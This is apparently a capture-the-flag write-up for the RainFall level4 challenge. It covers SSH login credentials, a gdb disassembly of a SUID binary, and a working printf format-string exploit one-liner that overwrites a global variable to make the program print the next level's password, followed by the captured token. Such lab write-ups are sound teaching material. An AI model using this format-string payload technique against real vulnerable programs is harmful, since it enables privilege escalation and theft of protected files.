login as the user `level4`

```
$ ssh -p 4242 level4@10.13.100.189
level4@10.13.100.189's password: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
level4@RainFall:~$
```

a `SUID` exactable file is locates in the home directory

```shell
level4@RainFall:~$ ls -l
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
level4@RainFall:~$ ./level4
f
f
level4@RainFall:~$ ./level4 f
e
e
level4@RainFall:~$
```

lets inspect the binary using gdb


```gdb
(gdb) info functions
...
0x08048444  p
0x08048457  n
0x080484a7  main
...
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) x/s 0x8048590
0x8048590:       "/bin/cat /home/user/level5/.pass"
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

```shell
level4@RainFall:~$ objdump -t ./level4 | grep .bss
08049804 l    d  .bss   00000000              .bss
08049808 l     O .bss   00000001              completed.6159
0804980c l     O .bss   00000004              dtor_idx.6161
08049804 g     O .bss   00000004              stdin@@GLIBC_2.0
08049810 g     O .bss   00000004              m
08049804 g       *ABS*  00000000              __bss_start
level4@RainFall:~$
```

the program calls the function `n` that reads from stdin then passes the input to `p` function, then it checkers wether the global variable `m` has the value `16930116` before getting the token


the function `p` passes its argument directly to printf, we can exploit this behavior by writing the value `16930116` at the address if `m`

```shell
python -c "print '\x10\x98\x04\x08' +  '%16930112x%12\$n'" | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
